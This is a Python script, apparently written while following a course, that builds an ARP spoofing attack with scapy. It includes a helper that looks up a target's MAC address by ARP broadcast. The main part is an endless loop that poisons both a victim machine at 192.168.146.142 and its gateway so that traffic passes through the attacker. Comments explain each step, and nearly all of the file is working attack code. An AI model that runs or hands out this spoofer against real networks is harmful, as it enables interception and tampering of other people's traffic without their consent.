#!usr/bin/env python3

import scapy.all as scapy
import time
import sys

# step 1 set op=2 means arp response not request.
# pdst=target ip, hwdst=target MAC address, psrc=router or gateway. in kali use route -n to find router.
# this packet makes W10 think it's talking to router.
# packet=scapy.ARP(op=2, pdst="192.168.146.142", hwdst="00:0c:29:5b:2f:2a", psrc="192.168.146.2")
# scapy.send(packet)
# used after/in step 1 to check info.
# print(packet.show())
# print(packet.summary())


# step 2 is making step 1 into a function and inserting the arguments/inputs.
# also implement a part of network_scanner. scan ip to get the target MAC address.


def get_mac(ip):
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast / arp_request
    answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]
    # though answered and unanswered appear, this will select only the first indices or the answered.

    return answered_list[0][1].hwsrc

    # clients_list = []
    # for element in answered_list:
    #     client_dict = {"ip": element[1].psrc, "mac": element[1].hwsrc}
    #     clients_list.append(client_dict)
    # return clients_list


# step 5 adding verbose=false to scapy send create variable below sent packets count and print packets
def spoof(target_ip, spoof_ip):
    target_mac = get_mac(target_ip)
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    scapy.send(packet, verbose=False)


# step 4 introduce while loop to keep packets rolling until attack is stopped

sent_packets_count = 0
while True:
    # step 3 tell target ip that , i am router ip
    spoof("192.168.146.142", "192.168.146.2")
    # step tell router ip, i am target ip
    spoof("192.168.146.2", "192.168.146.142")
    sent_packets_count = sent_packets_count + 2
    print("\r[+] Packets sent: " + str(sent_packets_count)),
    # step 6 is adding comma to have it print on 1 line.
    sys.stdout.flush()  # steps 6 is flushing the buffer where Python won't print until program stops. import sys
    time.sleep(2)  # need to import time.

# ctrl+c to stop
